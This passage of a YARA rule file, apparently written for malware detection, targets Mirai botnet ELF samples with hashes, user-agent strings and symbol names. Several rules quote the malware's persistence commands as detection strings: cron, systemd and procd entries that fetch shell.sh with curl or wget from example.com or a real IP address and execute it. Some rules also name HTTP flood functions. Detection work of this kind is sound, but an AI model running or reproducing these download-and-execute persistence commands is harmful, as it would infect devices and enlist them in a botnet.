      hash49 = "6424bb7a6ecc915a4fc3c93c533475e2b5b42d713432583fb54e0c9374bcbcf3"
      hash50 = "651779aabd025294cc8e22c9e75b0e499a6a1ab36b9ff1ec73a5d80f5736eef9"
      hash51 = "654826d8630bf9b3276e8c6ba79635a793efd946cd99df89f6e2cc52917bde1c"
      hash52 = "6604b582473738a39d8f2e92457cb827189d262b751c408b17bdabf38832734d"
      hash53 = "67036276b4fbe0afd07661cd49c3ce727a84141c77684d520f47a95323d59dbd"
      hash54 = "69a44dc7723a16f56805b9bc3aafa118e4333f7e8d91bb0ce8f4a3ff1cebf894"
      hash55 = "6bfb2a7b07e99847de1cfb1549d92097a4e8ef3293de9f5951e66af12d86a076"
      hash56 = "6c7d17e718fd500f16f7d4e900d5e80309b00fd2de3d241e249ba0772faf2b26"
   strings:
      $s1 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__253adc3b_Mirai_signature__2b37a8e3_Mirai_signature__3063b1a9_Mirai_signature__31_22 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_253adc3b.elf, Mirai(signature)_2b37a8e3.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_36bb77da.elf, Mirai(signature)_38e02ed8.elf, Mirai(signature)_3aea5a40.elf, Mirai(signature)_3b46c349.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_420c7996.elf, Mirai(signature)_44046931.elf, Mirai(signature)_44381eff.elf, Mirai(signature)_44999d62.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4e872d3b.elf, Mirai(signature)_4f248a58.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_5a1d9183.elf, Mirai(signature)_5d9434fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "253adc3bb48435122f8c3f39580b29c3ad66b88e1ac98e52420abf39bdbbba4e"
      hash3 = "2b37a8e3ec622f8ae9c3ac30aef1dfbb4af56ebe9a66675a0c40a5c61478d995"
      hash4 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash5 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash6 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash7 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash8 = "36bb77da16b12417510a0663735488cf4393e02518bbcf39e05d23c1449ae3ed"
      hash9 = "38e02ed85d0f7629e13f54489a430681477fd9694f35d4e864cf616708261372"
      hash10 = "3aea5a400d17dc668a67377eb012a5db00909644152679f834659dbac35e37f2"
      hash11 = "3b46c349abed5ce9921e875eea04c890d03f1950d653a8a4821aa2a68d8a2970"
      hash12 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash13 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash14 = "420c79968123a4bb09e9ff5640ab32da1eb0677ea1a9516f70f40a9dfbefa46c"
      hash15 = "440469312d3679107da05cf3f222ec3042e01dab0cef3cb94568113ccb57d277"
      hash16 = "44381effdd350359a39db85ada72c070037c844ee032efd1b50cfa99e28f3325"
      hash17 = "44999d62550d79ea67ace000bfe5d83cafd6678decb14da5b841db9d33de70e0"
      hash18 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash19 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash20 = "4e872d3be5179467ff6f82e474edb840fbb2a20823e6d06cfee931efcc127495"
      hash21 = "4f248a582a083d8d67d18ae8c2acaa4cfc88b00d882c4f6ba256148b5db96b73"
      hash22 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash23 = "5a1d91831955900ce61ac7df64647bd67396329f246a22e104f9ddd9ecf7dc57"
      hash24 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
   strings:
      $s1 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s2 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s3 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s4 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s5 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s6 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s7 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s8 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s9 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s10 = "__encode_header" fullword ascii /* score: '9.00'*/
      $s11 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s12 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__420c7996_Mirai_signature__44046931_Mirai_signature__4e872d3b_23 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_420c7996.elf, Mirai(signature)_44046931.elf, Mirai(signature)_4e872d3b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "420c79968123a4bb09e9ff5640ab32da1eb0677ea1a9516f70f40a9dfbefa46c"
      hash2 = "440469312d3679107da05cf3f222ec3042e01dab0cef3cb94568113ccb57d277"
      hash3 = "4e872d3be5179467ff6f82e474edb840fbb2a20823e6d06cfee931efcc127495"
   strings:
      $s1 = "HTTP.GET" fullword ascii /* score: '18.00'*/
      $s2 = "GET /%s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s3 = "GET %s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s4 = "HTTP.OVH" fullword ascii /* score: '13.00'*/
      $s5 = "parse_command" fullword ascii /* score: '12.00'*/
      $s6 = "attack_http_get" fullword ascii /* score: '12.00'*/
      $s7 = "make_ip_header" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__264370b8_Mirai_signature__26f251ca_Mirai_signature__2ee9a42c_Mirai_signature__37e39ec8_Mirai_signature__3f_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_264370b8.elf, Mirai(signature)_26f251ca.elf, Mirai(signature)_2ee9a42c.elf, Mirai(signature)_37e39ec8.elf, Mirai(signature)_3fb73ed9.elf, Mirai(signature)_4dcdbd21.elf, Mirai(signature)_6407da13.elf, Mirai(signature)_6bfe1ef9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "264370b846197763bef4997522caa5baad2628f61d1da509d405038a45b91e1c"
      hash2 = "26f251ca933cc3dedacea77772e89d86633c93a824f4cb3a9f7461cd0becee94"
      hash3 = "2ee9a42c7da356fc65fa94d18094ec12d967536a76a053437870646f3d0667f5"
      hash4 = "37e39ec80792fb487504db381da4cbebe9737e6cc1ca2af95542483567ed1256"
      hash5 = "3fb73ed97b6102825b24e6986148d5c1ab447d681a0bf72c7f4e47f01300932e"
      hash6 = "4dcdbd21914f34f1c0b2a323da5a6840e7665ed56dc18b43a1638b721a1c2248"
      hash7 = "6407da1321eb83154352e38a25826d58e1a503da2fb67a201025b60b0957d388"
      hash8 = "6bfe1ef9772b6e98ce59df39a922e07ec789e8a629f38eed755aaa7e74382802"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '53.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '50.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '45.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '44.00'*/
      $x5 = "askid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '38.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x7 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x8 = "$t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart') | " ascii /* score: '36.00'*/
      $x9 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '36.00'*/
      $x10 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '35.00'*/
      $x11 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $s13 = "        if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s14 = "      if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s15 = "h $T&; rm -f $T; break; fi; rm -f $T; done; exec %s skidstart'" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__3faf4357_Mirai_signature__551cbc16_Mirai_signature__56ca29b1_Mirai_signature__572b6ab3_Mirai_signature__5b_25 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_3faf4357.elf, Mirai(signature)_551cbc16.elf, Mirai(signature)_56ca29b1.elf, Mirai(signature)_572b6ab3.elf, Mirai(signature)_5b18c9cb.elf, Mirai(signature)_61c23c33.elf, Mirai(signature)_68f89833.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3faf435798bf284f72555578d9c55674772ad2d80ef3ed791ee0f0b3a59a1a1f"
      hash2 = "551cbc1698d7e07b9e00c4443098449f0a5ef09e14e7d861b757e853f77fe671"
      hash3 = "56ca29b158fe145953ba0165b56af3b0e533b8b155581e37174037abea8f3c60"
      hash4 = "572b6ab3c9095f00741c6c2f86f1d477fad4bb568b6cc4ac6ad8d7e42353cbbf"
      hash5 = "5b18c9cbe6bccec88732d23ce39ba1d863cb8487cb0c557cbbd169b9f61e886f"
      hash6 = "61c23c332c5f8e1952f0343471cd43b4b2c3376e591835dcd1c547702dcc8594"
      hash7 = "68f89833bf74c49260c19d9369124cd173373e5e493fae27be88ba788aac8613"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '51.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '48.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '43.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '42.00'*/
      $x5 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x7 = "raskid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [" ascii /* score: '36.00'*/
      $x8 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '34.00'*/
      $x9 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '33.00'*/
      $x10 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $x11 = "f $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart')" ascii /* score: '31.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $s13 = "      if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s14 = "        if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s15 = " -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart)' ; echo '@hourly for t in curl wget; do T=/tmp/.s$$; i" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__1f9f10b2_Mirai_signature__22a79267_Mirai_signature__22e98717_Mirai_signature__22ee9306_Mirai_signature__23_26 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1f9f10b2.elf, Mirai(signature)_22a79267.elf, Mirai(signature)_22e98717.elf, Mirai(signature)_22ee9306.elf, Mirai(signature)_23221097.elf, Mirai(signature)_240d245f.elf, Mirai(signature)_2597c95a.elf, Mirai(signature)_25ea89fb.elf, Mirai(signature)_27ff9d12.elf, Mirai(signature)_2841d8dd.elf, Mirai(signature)_284232d5.elf, Mirai(signature)_28490822.elf, Mirai(signature)_2862d90e.elf, Mirai(signature)_28a35af2.elf, Mirai(signature)_28a9b4b2.elf, Mirai(signature)_28e62c96.elf, Mirai(signature)_292d6977.elf, Mirai(signature)_29381f34.elf, Mirai(signature)_29c8b843.elf, Mirai(signature)_2c659376.elf, Mirai(signature)_307bd661.elf, Mirai(signature)_30ca894f.elf, Mirai(signature)_32d84ec7.elf, Mirai(signature)_33a96072.elf, Mirai(signature)_33b8ae25.elf, Mirai(signature)_33cc69f4.elf, Mirai(signature)_352800a6.elf, Mirai(signature)_35a9f749.elf, Mirai(signature)_36138be0.elf, Mirai(signature)_375962c5.elf, Mirai(signature)_376a651b.elf, Mirai(signature)_376dbcd5.elf, Mirai(signature)_3807a288.elf, Mirai(signature)_3925be6e.elf, Mirai(signature)_3972f47c.elf, Mirai(signature)_3b397447.elf, Mirai(signature)_3be62d68.elf, Mirai(signature)_3c338ab0.elf, Mirai(signature)_3c7ebe3c.elf, Mirai(signature)_3d04e257.elf, Mirai(signature)_3d7530b2.elf, Mirai(signature)_3e42a062.elf, Mirai(signature)_3effb150.elf, Mirai(signature)_3f06657d.elf, Mirai(signature)_3f62195c.elf, Mirai(signature)_40c45993.elf, Mirai(signature)_4104eb36.elf, Mirai(signature)_4238ce2f.elf, Mirai(signature)_4239a8f5.elf, Mirai(signature)_424562b2.elf, Mirai(signature)_453812f9.elf, Mirai(signature)_45ef79a2.elf, Mirai(signature)_46d7b19e.elf, Mirai(signature)_4772fd82.elf, Mirai(signature)_47cba150.elf, Mirai(signature)_4857d77b.elf, Mirai(signature)_485d6451.elf, Mirai(signature)_48d4ab62.elf, Mirai(signature)_497371c9.elf, Mirai(signature)_4a77d932.elf, Mirai(signature)_4b7b9cf3.elf, Mirai(signature)_4ccd3724.elf, Mirai(signature)_50bdf080.elf, Mirai(signature)_50d177bd.elf, Mirai(signature)_518c5818.elf, Mirai(signature)_52d868c0.elf, Mirai(signature)_52e97e03.elf, Mirai(signature)_535f82f6.elf, Mirai(signature)_55851feb.elf, Mirai(signature)_56f04b6a.elf, Mirai(signature)_579ca814.elf, Mirai(signature)_58a4441b.elf, Mirai(signature)_5931c9a2.elf, Mirai(signature)_59d028da.elf, Mirai(signature)_5c494f42.elf, Mirai(signature)_5c61302f.elf, Mirai(signature)_5e4c9376.elf, Mirai(signature)_5f47b1f2.elf, Mirai(signature)_5f7fc8f6.elf, Mirai(signature)_601bcbe1.elf, Mirai(signature)_602724b6.elf, Mirai(signature)_60302a1e.elf, Mirai(signature)_6054a337.elf, Mirai(signature)_61d70735.elf, Mirai(signature)_64130060.elf, Mirai(signature)_6424bb7a.elf, Mirai(signature)_651779aa.elf, Mirai(signature)_654826d8.elf, Mirai(signature)_6604b582.elf, Mirai(signature)_67036276.elf, Mirai(signature)_67a6972a.elf, Mirai(signature)_67f0fa8b.elf, Mirai(signature)_6819b249.elf, Mirai(signature)_69a44dc7.elf, Mirai(signature)_6a5af377.elf, Mirai(signature)_6bfb2a7b.elf, Mirai(signature)_6c7d17e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f9f10b2927fc7ea44d21b13644ef38639978f1269cb48e55ec00aab69ef2736"
      hash2 = "22a792676106bbacc7518d1e67d4c95a6fc67d3ef9c06d32bc7dc40987ced6c5"
      hash3 = "22e98717329a93b5e31869e8e239defb08e9d32ab388067062e585b98194efa8"
      hash4 = "22ee9306a773fea4515508caa04473d7147cdada41a5f55c1bc5e4c9dc842227"
      hash5 = "23221097a774856da567c9d4c371d86f4e4f84cb3bc8846008341b778d33f306"
      hash6 = "240d245f60e896a4aa332816226b0d23defcb95b0f99bd6ed1ad302465539582"
      hash7 = "2597c95a8f9085a94fbcd4ae7470ed79812ec4abeb208350710701870770fe2b"
      hash8 = "25ea89fb1b30e27092b7d75d8f593ddcc2851d17bb569505e993b6e7bca75182"
      hash9 = "27ff9d1260652d1ab75a3890ae7a980f5290ac245077f2b23a77dee01e04bb0d"
      hash10 = "2841d8ddd441e5575b3ba86995f2272bbc9cdcbc95fbc56d7fecc2215147b6e1"
      hash11 = "284232d59ff169e270a09eb2edef558f9d8efb4ee62c91ce980d792f300586c5"
      hash12 = "28490822cbbfe22394c661432fec339e9a7f98ee7ebe00f79547e1a307597c05"
      hash13 = "2862d90e7dcadfd70ac0fd786414cc8424354883a821f426a15995a0b9d727c6"
      hash14 = "28a35af21fb5923947d051e57e29c93367fbabb39f30b09a5c9a86c2570a961f"
      hash15 = "28a9b4b286ab25170ed4bd6008aa01df4c2d0f04b8b68c1523e1269737a92108"
      hash16 = "28e62c96900f40ae25c479521db7e0ad4af8460dc57539cc8f0106e80b0ff47f"
      hash17 = "292d6977a7859de6e3e1bb66deec7678daab6d718d0ff99bb2dca284b3ff3869"
      hash18 = "29381f34ea6ac17ab22423f0665f818e3f18320a57d28b994464a5e19de1d717"
      hash19 = "29c8b84338ce539feaebacaf469246eb82bb9e5ebaaaf811d5df2dc36bd6a70b"
      hash20 = "2c6593762fb1c9303ae7b346cfe0b9b2a49926d9e4a8fcec3193935d8a3f5a0f"
      hash21 = "307bd661e890535ff5bf14aa7f17128d7feb1006a04bb26965b034d5fe214ca3"
      hash22 = "30ca894f1ee8d85655cbcc68a6ad93730cda55760fc616b197ef237134a6649e"
      hash23 = "32d84ec7a5f4c8c081fac153b98d3ad0855360e17b1ee505bc431544f71f2f65"
      hash24 = "33a960729b9805f72b3a7dd14fd123f6f71863d16c8b933ebcff1efbcdc685a5"
      hash25 = "33b8ae256391ee27d1e0b2fd3adf61598d98f8e53918f777169b828bbfccbbfb"
      hash26 = "33cc69f4ed153131d5b5f5af26b5dce6389ad2fc81b1f7ed8128f3a5c8c62eb0"
      hash27 = "352800a63dc4ff68272c041ea4c6026ff8c01f2b1591d118a9d54c91213e2fed"
      hash28 = "35a9f749dc6c8d4347adae5c8161277691050c7c9db85c9852bd21945bf53ee9"
      hash29 = "36138be064c2ad56445d84f82d31a5bedac0f6301e0231be49ebeda59cbdc9d9"
      hash30 = "375962c5f822703ac53f42e26b684dfc8db10c49abbfd08ef38ce7be097f9a35"
      hash31 = "376a651bbad48cf87f251c4698564ea2af7fddcea092aed098369c2cbdb3a161"
      hash32 = "376dbcd54bd7877002637fe2a091fe6320d715a4c0b932e73420662aaf1356ad"
      hash33 = "3807a288db8989920d148451c3835f0b7575c901dff9bd5fa9fd0ba96c26356c"
      hash34 = "3925be6e76a13bc16e8b3793bb72e8dccb6942ad0473eda1da310775ddc22119"
      hash35 = "3972f47ccd7ece29b73fb2b51f7949efbaa350bee28295b283cc49f1812cdafe"
      hash36 = "3b397447fafcfb6765017f1c7818f1ce8dcf64d63c4eb0dea04a836edb539c2b"
      hash37 = "3be62d68457387363efdf7af26ba9bc30427ff95d7fe8a72c477bf669ed2c88a"
      hash38 = "3c338ab029f7d1b3ca70ec0e0d77cea04b7ab3af82ee9404c60ae41eb95cc7cf"
      hash39 = "3c7ebe3cfe5d0f1193a382c53aa8c3aaf964e5853b6ec1921aea3afa52fc7fb9"
      hash40 = "3d04e2573c48eb48bf106335684610ba149da3c27618f227f7218dd1ce59a962"
      hash41 = "3d7530b2277449d52dcdac5f911ce7f4566bad04614fa1d65ae873024fdbecb5"
      hash42 = "3e42a062cbfd38321f0045c3848a2cd3c4e80d4a5fe056b5b9cda8933fe21a76"
      hash43 = "3effb150dc2e695a8d7da372fc1adf107a5865433bf6d002c000f24acdd8902d"
      hash44 = "3f06657d12f2b75792dfbdd97769fda9041630f97b1250978b96e76867f45442"
      hash45 = "3f62195c8b20a04fe4d7d9e95ae363a33ad3aace26edaf5917d48c3a46e3fb4d"
      hash46 = "40c4599334b0a9b83e2e1e39d620fed0d0d39cd2cf2b49e78d75591eada74633"
      hash47 = "4104eb36b126ff8e005a51d211d2338e34a5a9a26fdd45863660b6686c8ba567"
      hash48 = "4238ce2f7725cd3b8cc24c971f3ace2665c8d55ec00e496f4b1796ac393fc64b"
      hash49 = "4239a8f519041d219630898100dfe2df6d4fb7a0b2fcf43cc2271d3180e2be51"
      hash50 = "424562b2dbc7f718054e75e7e3663c0451b404d546dc759b2a93f4bff35f3ceb"
      hash51 = "453812f9ec23c1df6e78226f471673cf10358e475af0975ca08c87f442af2578"
      hash52 = "45ef79a2b25c5c2c0d4cb32fa58cc35d35f05f7f6d0106114653b7e52ba68005"
      hash53 = "46d7b19eae869f1b8f3d18d14759898495cc26454eaf899f276ebabe7eb384e0"
      hash54 = "4772fd82829665b4728291555df77f3bed95dc615d0c656fdcbab7e34d02ab4e"
      hash55 = "47cba150aa0c2506f451f3f54bee3d81f439987fa9d516a0c438039391502afe"
      hash56 = "4857d77b363f37e8b67a6a3084724c9e8c813965f456612e62ebd6aa6167638e"
      hash57 = "485d6451a00c6c72a0b5f357b75f14ce846a9ae8ca3f3978069d7b8831ff4d87"
      hash58 = "48d4ab62718334ed89761c20287161a165671724c67a066d52712f291d9ebd50"
      hash59 = "497371c90b617e3735b8c6bb8b616dcc01210c103add22c31da827d1b03efc94"
      hash60 = "4a77d9320eeed1bb5a347de5fdb53d0e6e1129d743be63f616e9eaded61d1981"
      hash61 = "4b7b9cf380c83861c71a9ac449dc57743d438adcd7d939acc53e0b890cddad63"
      hash62 = "4ccd37241e4301b2c05dfbe0a4b8683edcc3b86d1d5c116b05493fea3d3e09f0"
      hash63 = "50bdf08010391def9c0005215496a286a28daac16b1756c61c0affc7fdccbc5c"
      hash64 = "50d177bda99132b588d0a2a68179780bf445216229d226577775c31789bd748b"
      hash65 = "518c58184bf4497a843a51bd3532817eda66d924cad1191ca9df533f9bcb39c0"
      hash66 = "52d868c02372cbf461e43e143c9fbf76eba18e602c7dbe1304150a46d8946e1f"
      hash67 = "52e97e039346cc1203b3634aee0dc9748a24ee9ebd79af658809c9d183efbae8"
      hash68 = "535f82f626880949e6d84c365436fd441665d6085d6c87e3bfb103d38ad381d8"
      hash69 = "55851febf771dbddd9bd0c9cd72fdb76a66e3aefc73a1bb7598cd69c8964c746"
      hash70 = "56f04b6a7987032d21da319edbb0f2abe30f83c3e67baf3e8e4c17f41c45a6be"
      hash71 = "579ca814f8695e29d7f9f027e8445f3bd9b438266efb3229d81ec9421668bfc9"
      hash72 = "58a4441b65d6f3a28eb64dbabdfe667e0e6f3101f6efb855b5f488002929dc82"
      hash73 = "5931c9a2ffe1a8fb7acf99f1f9e32ed6c96d937fd3ef8ba837f4f3996adfa58c"
      hash74 = "59d028da1dda15a4bb24f15b8aff0002c939c2853c721ff2cf46744e8d7691d4"
      hash75 = "5c494f42bb0469f756fde99533b808270703343a27d9eae2882babd5f5c14fdf"
      hash76 = "5c61302f669d668a091e8bccdd15c09baf7e8e8a925f38b4e317880a5fc3246f"
      hash77 = "5e4c93769059edf9e79fe41fb51fb33cc73ba9ec52ff7d470c5755fb819b5278"
